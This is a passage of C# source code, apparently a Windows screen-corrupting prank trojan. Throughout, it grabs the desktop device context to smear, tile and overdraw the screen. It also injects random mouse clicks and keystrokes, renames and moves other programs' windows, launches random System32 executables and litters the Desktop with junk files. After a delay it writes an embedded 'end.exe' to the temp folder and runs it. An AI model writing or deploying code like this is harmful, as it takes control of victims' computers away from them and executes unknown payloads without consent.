            private static int ballPosX1 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY1 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX1 = r.Next(1,17);
            private static int moveStepY1 = r.Next(1, 17);
            private static int ballWidth2 = 0;
            private static int ballHeight2 = 0;
            private static int ballPosX2 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY2 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX2 = r.Next(1,17);
            private static int moveStepY2 = r.Next(1, 17);

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    StretchBlt(intPtr, 0, 0, screenW/2, screenH/2, intPtr, 0, 0, screenW, screenH, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(intPtr, screenW / 2, 0, screenW / 2, screenH / 2, intPtr, 0, 0, screenW, screenH, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(intPtr, 0, screenH / 2, screenW / 2, screenH / 2, intPtr, 0, 0, screenW, screenH, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(intPtr, screenW / 2, screenH / 2, screenW / 2, screenH / 2, intPtr, 0, 0, screenW, screenH, TernaryRasterOperations.SRCCOPY);
                    Graphics g = Graphics.FromHdc(intPtr);
                    ballPosX += moveStepX;
                    if (
                        ballPosX < 0 ||
                        ballPosX + ballWidth > screenW
                        )
                    {
                        moveStepX = -moveStepX;
                    }

                    ballPosY += moveStepY;
                    if (
                        ballPosY < 0 ||
                        ballPosY + ballHeight > screenH
                        )
                    {
                        moveStepY = -moveStepY;

                    }
                    ballPosX1 += moveStepX1;
                    if (
                        ballPosX1 < 0 ||
                        ballPosX1 + ballWidth1 > screenW
                        )
                    {
                        moveStepX1 = -moveStepX1;
                    }

                    ballPosY1 += moveStepY1;
                    if (
                        ballPosY1 < 0 ||
                        ballPosY1 + ballHeight1 > screenH
                        )
                    {
                        moveStepY1 = -moveStepY1;

                    }
                    ballPosX2 += moveStepX2;
                    if (
                        ballPosX2 < 0 ||
                        ballPosX2 + ballWidth2 > screenW
                        )
                    {
                        moveStepX2 = -moveStepX2;
                    }

                    ballPosY2 += moveStepY2;
                    if (
                        ballPosY2 < 0 ||
                        ballPosY2 + ballHeight2 > screenH
                        )
                    {
                        moveStepY2 = -moveStepY2;

                    }
                    cc += 10;
                    HSL data = new HSL(cc % 360, 1f, 0.5f);
                    RGB value = HSLToRGB(data);
                    Brush brush = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
                    Pen pen = new Pen(Color.Red);
                    PointF point1 = new PointF(ballPosX, ballPosY);
                    PointF point2 = new PointF(ballPosX1, ballPosY1);
                    PointF point3 = new PointF(ballPosX2, ballPosY2);
                    PointF[] curvePoints = {point1,point2,point3};
                    g.FillPolygon(brush, curvePoints);
                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, (int)CopyPixelOperation.SourceCopy);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer16 : Drawer
        {
            private int redrawCounter;
            private int redrawCounter2;
            private static Random r = new Random();
            private int cc;
            private static int ballWidth = 0;
            private static int ballHeight = 0;
            private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX = r.Next(1, 17);
            private static int moveStepY = r.Next(1, 17);
            private static int ballWidth1 = 0;
            private static int ballHeight1 = 0;
            private static int ballPosX1 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY1 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX1 = r.Next(1, 17);
            private static int moveStepY1 = r.Next(1, 17);
            private static int ballWidth2 = 0;
            private static int ballHeight2 = 0;
            private static int ballPosX2 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY2 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX2 = r.Next(1, 17);
            private static int moveStepY2 = r.Next(1, 17);

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    for (int i = 0; i < screenW; i += 1)
                    {
                        BitBlt(intPtr, 0, i, screenW, 1, intPtr, random.Next(-5, 6), i, 13369376);
                    }
                    Graphics g = Graphics.FromHdc(intPtr);
                    ballPosX += moveStepX;
                    if (
                        ballPosX < 0 ||
                        ballPosX + ballWidth > screenW
                        )
                    {
                        moveStepX = -moveStepX;
                    }

                    ballPosY += moveStepY;
                    if (
                        ballPosY < 0 ||
                        ballPosY + ballHeight > screenH
                        )
                    {
                        moveStepY = -moveStepY;

                    }
                    ballPosX1 += moveStepX1;
                    if (
                        ballPosX1 < 0 ||
                        ballPosX1 + ballWidth1 > screenW
                        )
                    {
                        moveStepX1 = -moveStepX1;
                    }

                    ballPosY1 += moveStepY1;
                    if (
                        ballPosY1 < 0 ||
                        ballPosY1 + ballHeight1 > screenH
                        )
                    {
                        moveStepY1 = -moveStepY1;

                    }
                    ballPosX2 += moveStepX2;
                    if (
                        ballPosX2 < 0 ||
                        ballPosX2 + ballWidth2 > screenW
                        )
                    {
                        moveStepX2 = -moveStepX2;
                    }

                    ballPosY2 += moveStepY2;
                    if (
                        ballPosY2 < 0 ||
                        ballPosY2 + ballHeight2 > screenH
                        )
                    {
                        moveStepY2 = -moveStepY2;

                    }
                    cc += 10;
                    HSL data = new HSL(cc % 360, 1f, 0.5f);
                    RGB value = HSLToRGB(data);
                    Brush brush = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
                    Pen pen = new Pen(Color.Red);
                    PointF point1 = new PointF(ballPosX, ballPosY);
                    PointF point2 = new PointF(ballPosX1, ballPosY1);
                    PointF point3 = new PointF(ballPosX2, ballPosY2);
                    PointF[] curvePoints = { point1, point2, point3 };
                    g.FillPolygon(brush, curvePoints);
                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, (int)CopyPixelOperation.SourceCopy);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer17 : Drawer
        {
            private int cc;

            Icon app = Extract("user32.dll", 5, true);
            Icon warn_ico = Extract("user32.dll", 1, true);
            Icon no_ico = Extract("user32.dll", 3, true);

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    for (int i = 0; i < 100; i++)
                    {
                        int xgago = random.Next(-screenW, screenW + screenW);
                        int ygago = random.Next(-screenH, screenH + screenH);
                        int xbobo = random.Next(-screenW, screenW + screenW);
                        int ybobo = random.Next(-screenH, screenH + screenH);
                        BitBlt(intPtr, xgago, ygago, xbobo, ybobo, intPtr, xgago + random.Next(-10, 11), ygago + random.Next(-10, 11), 13369376);

                    }
                    Graphics g = Graphics.FromHdc(intPtr);
                    for (int i = 0; i < screenH; i += 2)
                    {

                        cc += 1;

                        HSL data = new HSL(cc%360, 1f, 0.5f);
                        RGB value = HSLToRGB(data);

                        Pen huePen = new Pen(Color.FromArgb(128, value.R, value.G, value.B), 1);
                        //IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.FromArgb(value.R, value.G, value.B)));
                        //SelectObject(hcdc, hgdiobj);
                        //PatBlt(hcdc, i, 0, 1, screenH, CopyPixelOperation.PatInvert);
                        g.DrawLine(huePen, 0, i, screenW, i);
                    }
                    System.Type cursorsType = typeof(Cursors);
                    System.Reflection.PropertyInfo[] pros = cursorsType.GetProperties(System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
                    foreach (System.Reflection.PropertyInfo pro in pros)
                    {
                        Point drawPoint = new Point(random.Next(screenW), random.Next(screenH));
                        Cursor cur = (Cursor)pro.GetValue(null, null);
                        cur.Draw(g, new Rectangle(drawPoint, cur.Size));
                    }
                    Bitmap appicon = app.ToBitmap();
                    Bitmap warnicon = warn_ico.ToBitmap();
                    Bitmap noicon = no_ico.ToBitmap();
                    g.DrawImage(appicon, random.Next(screenW), random.Next(screenH), random.Next(200), random.Next(200));
                    g.DrawImage(warnicon, random.Next(screenW), random.Next(screenH), random.Next(200), random.Next(200));
                    g.DrawImage(noicon, random.Next(screenW), random.Next(screenH), random.Next(200), random.Next(200));
                    _BLENDFUNCTION blf = new _BLENDFUNCTION();
                    blf.BlendOp = AC_SRC_OVER;
                    blf.BlendFlags = 0;
                    blf.SourceConstantAlpha = (byte)random.Next(255);
                    blf.AlphaFormat = 0;
                    AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    g.Dispose();
                }
                catch { }
            }
        }

        private class Drawer18 : Drawer
        {
            private int redrawCounter;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    for (int i = 0; i < 500; i++)
                    {
                        int num = random.Next(-screenW, screenW + screenW);
                        int num2 = random.Next(-screenH, screenH + screenH);
                        int nWidth = random.Next(-screenW, screenW + screenW);
                        int nHeight = random.Next(-screenH, screenH + screenH);
                        BitBlt(intPtr, num, num2, nWidth, nHeight, intPtr, num + random.Next(-1, 2), num2 + random.Next(-1, 2), 13369376);
                    }
                    _BLENDFUNCTION blf = new _BLENDFUNCTION();
                    blf.BlendOp = AC_SRC_OVER;
                    blf.BlendFlags = 0;
                    blf.SourceConstantAlpha = (byte)127.5;
                    blf.AlphaFormat = 0;
                    AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch
                {
                }
            }
        }

        private class Drawer19 : Drawer
        {
            private int redrawCounter;
            private int redrawCounter2;
            private static Random r = new Random();
            private int cc;
            private static int ballWidth = 0;
            private static int ballHeight = 0;
            private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX = r.Next(1, 17);
            private static int moveStepY = r.Next(1, 17);
            private static int ballWidth1 = 0;
            private static int ballHeight1 = 0;
            private static int ballPosX1 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY1 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX1 = r.Next(1, 17);
            private static int moveStepY1 = r.Next(1, 17);
            private static int ballWidth2 = 0;
            private static int ballHeight2 = 0;
            private static int ballPosX2 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY2 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX2 = r.Next(1, 17);
            private static int moveStepY2 = r.Next(1, 17);
            private static int ballWidth3 = 0;
            private static int ballHeight3 = 0;
            private static int ballPosX3 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY3 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX3 = r.Next(1, 17);
            private static int moveStepY3 = r.Next(1, 17);
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    for (int i = 0; i < screenW; i += 1)
                    {
                        BitBlt(intPtr, 0, i, screenW, 1, intPtr, random.Next(-5, 6), i, 13369376);
                    }
                    Graphics g = Graphics.FromHdc(intPtr);
                    ballPosX += moveStepX;
                    if (
                        ballPosX < 0 ||
                        ballPosX + ballWidth > screenW
                        )
                    {
                        moveStepX = -moveStepX;
                    }

                    ballPosY += moveStepY;
                    if (
                        ballPosY < 0 ||
                        ballPosY + ballHeight > screenH
                        )
                    {
                        moveStepY = -moveStepY;

                    }
                    ballPosX1 += moveStepX1;
                    if (
                        ballPosX1 < 0 ||
                        ballPosX1 + ballWidth1 > screenW
                        )
                    {
                        moveStepX1 = -moveStepX1;
                    }

                    ballPosY1 += moveStepY1;
                    if (
                        ballPosY1 < 0 ||
                        ballPosY1 + ballHeight1 > screenH
                        )
                    {
                        moveStepY1 = -moveStepY1;

                    }
                    ballPosX2 += moveStepX2;
                    if (
                        ballPosX2 < 0 ||
                        ballPosX2 + ballWidth2 > screenW
                        )
                    {
                        moveStepX2 = -moveStepX2;
                    }

                    ballPosY2 += moveStepY2;
                    if (
                        ballPosY2 < 0 ||
                        ballPosY2 + ballHeight2 > screenH
                        )
                    {
                        moveStepY2 = -moveStepY2;

                    }
                    ballPosX3 += moveStepX3;
                    if (
                        ballPosX3 < 0 ||
                        ballPosX3 + ballWidth3 > screenW
                        )
                    {
                        moveStepX3 = -moveStepX3;
                    }

                    ballPosY3 += moveStepY3;
                    if (
                        ballPosY3 < 0 ||
                        ballPosY3 + ballHeight3 > screenH
                        )
                    {
                        moveStepY3 = -moveStepY3;

                    }
                    cc += 10;
                    HSL data = new HSL(cc % 360, 1f, 0.5f);
                    RGB value = HSLToRGB(data);
                    
                    Pen pen = new Pen(Color.FromArgb(value.R, value.G, value.B),32);
                    pen.StartCap = pen.EndCap = LineCap.Round;
                    Point p1 = new Point(ballPosX, ballPosY);
                    Point p2 = new Point(ballPosX1, ballPosY1);
                    Point p3 = new Point(ballPosX2, ballPosY2);
                    Point p4 = new Point(ballPosX3, ballPosY3);
                    g.DrawBezier(pen, p1,p2,p3,p4);
                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, (int)CopyPixelOperation.SourceCopy);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer20 : Drawer
        {
            private int redrawCounter2;
            private int redrawCounter;
            private static Random r = new Random();
            private int cc;
            private static int ballWidth = 200;
            private static int ballHeight = 200;
            private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 200);
            private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 200);
            private static int moveStepX = 10;
            private static int moveStepY = 10;
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    Graphics g = Graphics.FromHdc(intPtr);
                    float x1 = 0;
                    float y1 = 0;

                    float y2 = 0;

                    float yEx = 0;
                    float ef = 100;

                    for (float x = 0; x < Screen.PrimaryScreen.Bounds.Height / 10; x += 0.1F)
                    {
                        y2 = (float)Math.Sin(x);
                        redrawCounter2 += 1;
                        int rd2 = redrawCounter2;
                        int f2int = (int)Math.Round(y1 * ef + yEx);
                        BitBlt(intPtr, f2int, 0 + rd2, screenW, 1, intPtr, 0, 0 + rd2, 13369376);
                        BitBlt(intPtr, screenW + f2int, 0 + rd2, screenW, 1, intPtr, 0, 0 + rd2, 13369376);
                        BitBlt(intPtr, -screenW + f2int, 0 + rd2, screenW, 1, intPtr, 0, 0 + rd2, 13369376);
                        if (redrawCounter2 >= screenH) { redrawCounter2 = 0; }
                        x1 = x;
                        y1 = y2;
                    }
                    ballPosX += moveStepX;
                    if (
                        ballPosX < 0 ||
                        ballPosX + ballWidth > screenW
                        )
                    {
                        moveStepX = -moveStepX;
                    }

                    ballPosY += moveStepY;
                    if (
                        ballPosY < 0 ||
                        ballPosY + ballHeight > screenH
                        )
                    {
                        moveStepY = -moveStepY;

                    }
                    cc += 10;
                    HSL data = new HSL(cc % 360, 1f, 0.5f);
                    RGB value = HSLToRGB(data);
                    Brush brush = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
                    Pen pen = new Pen(Color.Red);
                    g.FillEllipse(brush, ballPosX, ballPosY, ballWidth, ballHeight);
                    for (int i = 0; i < 100; i += 10)
                    {
                        g.DrawEllipse(pen, ballPosX - i / 2, ballPosY - i / 2, ballWidth + i, ballHeight + i);
                    }
                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch
                {
                }
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;

        public static void DoMouseClick()
        {
            uint X = (uint)Cursor.Position.X;
            uint Y = (uint)Cursor.Position.Y;
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
        }
        private class Cur : Drawer
        {

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    Cursor.Position = new Point(random.Next(screenW), random.Next(screenH));
                    DoMouseClick();
                    Thread.Sleep(random.Next(0, 1000));
                }
                catch { }
                Thread.Sleep(0);
            }
        }
        [DllImport("user32.dll")]
        static extern bool SetWindowText(IntPtr hWnd, string text);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        private class Windowtext : Drawer
        {
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    Process myProcess = new Process();
                    Process[] processes = Process.GetProcesses();

                    foreach (var process in processes)
                    {

                        IntPtr handle = process.MainWindowHandle;
                        if (handle != IntPtr.Zero)
                        {
                            // Creating object of random class
                            Random rand = new Random();

                            // Choosing the size of string
                            // Using Next() string
                            int stringlen = rand.Next(4, 10);
                            int randValue;
                            string str = "";
                            char letter;
                            for (int i = 0; i < stringlen; i++)
                            {

                                // Generating a random number.
                                randValue = rand.Next(0, 6969);

                                // Generating random character by converting
                                // the random number into character.
                                letter = Convert.ToChar(randValue + rand.Next(0, 6969));

                                // Appending the letter to string.
                                str = str + letter;
                            }
                            SetWindowText(GetForegroundWindow(), str);
                            SetWindowText(process.Handle, str);
                            SetWindowText(handle, str);
                            Thread.Sleep(0);
                        }
                    }
                }
                catch { }

            }
        }

        private class Type : Drawer
        {
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    // Creating object of random class
                    Random rand = new Random();

                    // Choosing the size of string
                    // Using Next() string
                    int stringlen = rand.Next(4, 10);
                    int randValue;
                    string str = "";
                    char letter;
                    for (int i = 0; i < stringlen; i++)
                    {

                        // Generating a random number.
                        randValue = rand.Next(0, 6969);

                        // Generating random character by converting
                        // the random number into character.
                        letter = Convert.ToChar(randValue + rand.Next(0, 6969));

                        // Appending the letter to string.
                        str = str + letter;
                    }
                    SendKeys.SendWait(str);
                    Thread.Sleep(random.Next(1000));
                }
                catch { }
            }
        }
        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
        private class Window : Drawer
        {

            public override void Draw(IntPtr hdc)
            {
                Process myProcess = new Process();
                Process[] processes = Process.GetProcesses();

                foreach (var process in processes)
                {
                    try
                    {
                        Console.WriteLine("Process Name: {0} ", process.ProcessName);

                        IntPtr handle = process.MainWindowHandle;
                        if (handle != IntPtr.Zero)
                        {
                            Random r = new Random();
                            MoveWindow(GetForegroundWindow(), random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), true);
                            MoveWindow(handle, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), true);
                            MoveWindow(process.Handle, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), true);
                            MoveWindow(hdc, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH), true);
                            Thread.Sleep(random.Next(0, 30000));
                        }
                    }
                    catch { }
                }


            }
        }
        private class Open : Drawer
        {

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    var rand = new Random();
                    var files = Directory.GetFiles("c:\\Windows\\System32");
                    Process.Start(files[rand.Next(files.Length)]);
                    Thread.Sleep(random.Next(15000, 30000));
                }
                catch { }
            }
        }

        private class SendM : Drawer
        {

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    Process myProcess = new Process();
                    Process[] processes = Process.GetProcesses();

                    foreach (var process in processes)
                    {

                        IntPtr handle = process.MainWindowHandle;
                        if (handle != IntPtr.Zero)
                        {

                            // Choosing the size of string
                            // Using Next() string
                            int stringlen = random.Next(100);
                            int randValue;
                            string str = "";
                            char letter;
                            for (int i = 0; i < stringlen; i++)
                            {

                                // Generating a random number.
                                randValue = random.Next(0, 255);

                                // Generating random character by converting
                                // the random number into character.
                                letter = Convert.ToChar(randValue + random.Next(0, 255));

                                // Appending the letter to string.
                                str = str + letter;
                            }
                            string s = str;
                            SetWindowText(handle, s);
                            SetWindowText(process.Handle, str);
                            StringBuilder stringBuilder = new StringBuilder(32767);
                            uint windowThreadProcessId = GetWindowThreadProcessId((int)GetForegroundWindow(), 0);
                            uint currentThreadId = GetCurrentThreadId();
                            AttachThreadInput(windowThreadProcessId, currentThreadId, fAttach: true);
                            int focus = GetFocus();
                            AttachThreadInput(windowThreadProcessId, currentThreadId, fAttach: false);
                            string text = str;
                            char[] array = new char[1];
                            for (int j = 0; j < array.Length; j++)
                            {
                                array[j] = text[random.Next(text.Length)];
                            }
                            string oldValue = new string(array);
                            SendMessage(focus, random.Next(0, 255), stringBuilder.Capacity, stringBuilder);
                            stringBuilder.Replace(oldValue, str);
                            stringBuilder.Append(str);
                            //stringBuilder.Clear();
                            SendMessage(focus, random.Next(0, 255), 0, stringBuilder); //5 Window, 10 blink, 11 black, 12 settext, 13 gettext, 16 delete buttons, 24 inv, 26 move,0x0030 font
                            Thread.Sleep(random.Next(5000));
                        }
                    }
                }
                catch { }
            }
        }

        private class createfiles : Drawer
        {
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    int stringlen = random.Next(100);
                    int randValue;
                    string str = "";
                    char letter;
                    for (int i = 0; i < stringlen; i++)
                    {

                        // Generating a random number.
                        randValue = random.Next(0, 255);

                        // Generating random character by converting
                        // the random number into character.
                        letter = Convert.ToChar(randValue + random.Next(0, 255));

                        // Appending the letter to string.
                        str = str + letter;
                    }
                    int stringlen1 = random.Next(100);
                    int randValue1;
                    string str1 = "";
                    char letter1;
                    for (int i = 0; i < stringlen1; i++)
                    {

                        // Generating a random number.
                        randValue1 = random.Next(0, 255);

                        // Generating random character by converting
                        // the random number into character.
                        letter1 = Convert.ToChar(randValue1 + random.Next(0, 255));

                        // Appending the letter to string.
                        str1 = str1 + letter1;
                    }
                    // Full file name 
                    string fileName = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), str + "." + str1);

                    try
                    {
                        // Check if file already exists. If yes, delete it. 
                        if (File.Exists(fileName))
                        {
                            File.Delete(fileName);
                        }

                        // Create a new file 
                        using (FileStream fs = File.Create(fileName))
                        {
                            // Add some text to file
                            Byte[] title = new UTF8Encoding(true).GetBytes(str);
                            fs.Write(title, 0, title.Length);
                            byte[] author = new UTF8Encoding(true).GetBytes(str1);
                            fs.Write(author, 0, author.Length);
                        }

                        // Open the stream and read it back.
                        using (StreamReader sr = File.OpenText(fileName))
                        {
                            string s = "";
                            while ((s = sr.ReadLine()) != null)
                            {
                                Console.WriteLine(s);
                            }
                        }
                    }
                    catch (Exception Ex)
                    {
                        Console.WriteLine(Ex.ToString());
                    }
                    Thread.Sleep(random.Next(30000, 60000));
                }
                catch { }
            }
        }

        private class msg : Drawer
        {
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    Application.Run(new Form1());
                }
                catch { }
            }
        }
        private class ends : Drawer
        {
            public override void Draw(IntPtr hdc)
            {

                Thread.Sleep(random.Next(600000));
                string path = Path.Combine(Path.GetTempPath(), "end.exe");
                File.WriteAllBytes(path, Tera_Bonus.Properties.Resources.end);
                Process.Start(path);

            }
        }
        private class bb : Drawer
        {


            public override void Draw(IntPtr hdc)
            {
                Random rnd = new Random(Guid.NewGuid().GetHashCode());
                int ra = GetSomeRandomNumber(1, 21);
                switch (ra)
                {
                    case 1:
                        byte1(random.Next(44100), 15);
                        break;
                    case 2:
                        byte2(random.Next(44100), 15);
                        break;
                    case 3:
                        byte3(random.Next(44100), 15);
                        break;
                    case 4:
                        byte4(random.Next(44100), 15);
                        break;
                    case 5:
                        byte5(random.Next(44100), 15);
                        break;
                    case 6:
                        byte6(random.Next(44100), 15);
                        break;
                    case 7:
                        byte7(random.Next(44100), 15);
                        break;
                    case 8:
                        byte8(random.Next(44100), 15);
                        break;
                    case 9:
                        byte9(random.Next(44100), 15);
                        break;
                    case 10:
                        byte10(random.Next(44100), 15);
                        break;
                    case 11:
                        byte11(random.Next(44100), 15);
                        break;
                    case 12:
                        byte12(random.Next(44100), 15);
                        break;
                    case 13:
                        byte13(random.Next(44100), 15);
                        break;
                    case 14:
                        byte14(random.Next(44100), 15);
                        break;
                    case 15:
                        byte15(random.Next(44100), 15);
                        break;
                    case 16:
                        byte16(random.Next(44100), 15);
                        break;
                    case 17:
                        byte17(random.Next(44100), 15);
                        break;
                    case 18:
                        byte18(random.Next(44100), 15);
                        break;
                    case 19:
                        byte19(random.Next(44100), 15);
                        break;
                    case 20:
                        byte20(random.Next(44100), 15);
                        break;
                }
            }
        }
        private abstract class Drawer
        {
            public bool running;

            public Random random = new Random();

            public int screenW = Screen.PrimaryScreen.Bounds.Width;

            public int screenH = Screen.PrimaryScreen.Bounds.Height;

            public void Start()
            {
                if (!running)
                {
                    running = true;
                    new Thread(DrawLoop).Start();
                }
            }

            public void Stop()
            {
                running = false;
            }

            private void DrawLoop()
            {
                while (running)
                {
                    IntPtr dC = GetDC(IntPtr.Zero);
                    Draw(dC);
                    ReleaseDC(IntPtr.Zero, dC);
                }
            }

            public void Redraw()
            {
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
            }

            public abstract void Draw(IntPtr hdc);
        }

        [Flags]
        private enum RedrawWindowFlags : uint
        {
            Invalidate = 1u,
            InternalPaint = 2u,
            Erase = 4u,
            Validate = 8u,
            NoInternalPaint = 0x10u,
            NoErase = 0x20u,
            NoChildren = 0x40u,
            AllChildren = 0x80u,
            UpdateNow = 0x100u,
            EraseNow = 0x200u,
            Frame = 0x400u,
            NoFrame = 0x800u
        }
        private class randomdrawer : Drawer
        {
            public override void Draw(IntPtr hdc)
            {
                Random rnd = new Random(Guid.NewGuid().GetHashCode());
                int ra = GetSomeRandomNumber(1, 21);
                Drawer drawer = new Drawer1();
                Drawer drawer2 = new Drawer2();
                Drawer drawer3 = new Drawer3();
                Drawer drawer4 = new Drawer4();
                Drawer drawer5 = new Drawer5();
                Drawer drawer6 = new Drawer6();
                Drawer drawer7 = new Drawer7();
                Drawer drawer8 = new Drawer8();
                Drawer drawer9 = new Drawer9();
                Drawer drawer10 = new Drawer10();
                Drawer drawer11 = new Drawer11();
                Drawer drawer12 = new Drawer12();
                Drawer drawer13 = new Drawer13();
                Drawer drawer14 = new Drawer14();
                Drawer drawer15 = new Drawer15();
                Drawer drawer16 = new Drawer16();
                Drawer drawer17 = new Drawer17();
                Drawer drawer18 = new Drawer18();
                Drawer drawer19 = new Drawer19();
                Drawer drawer20 = new Drawer20();
                switch (ra)
                {
                    case 1:
                        drawer.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer.Stop();
                        break;
                    case 2:
                        drawer2.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer2.Stop();
                        break;
                    case 3:
                        drawer3.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer3.Stop();
                        break;
                    case 4:
                        drawer4.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer4.Stop();
                        break;
                    case 5:
                        drawer5.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer5.Stop();
                        break;
                    case 6:
                        drawer6.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer6.Stop();
                        break;
                    case 7:
                        drawer7.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer7.Stop();
                        break;
                    case 8:
                        drawer8.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer8.Stop();
                        break;
                    case 9:
                        drawer9.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer9.Stop();
                        break;
                    case 10:
                        drawer10.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer10.Stop();
                        break;
                    case 11:
                        drawer11.Start();
                        Thread.Sleep(random.Next(15000));
                        drawer11.Stop();
                        break;
